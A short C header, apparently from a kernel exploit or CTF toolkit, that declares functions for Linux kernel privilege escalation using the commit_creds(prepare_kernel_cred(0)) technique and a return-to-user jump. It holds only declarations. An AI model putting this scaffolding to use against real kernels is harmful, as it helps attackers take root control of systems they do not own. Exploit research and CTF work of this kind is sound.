#ifndef PRIVESC_H
#define PRIVESC_H

#include <stdint.h>  // for uintptr_t

/* Kernel Privesc via kcred */

// commit_creds(prepare_kernel_cred(0)); jmp to ret2user
void privesc_kcred(uintptr_t commit_creds,
                   uintptr_t prepare_kernel_cred,
                   void (*jmp_ret)(void));

/* Wrapper that sets up globals for privesc functions */
void privesc(void);

#endif  // PRIVESC_H
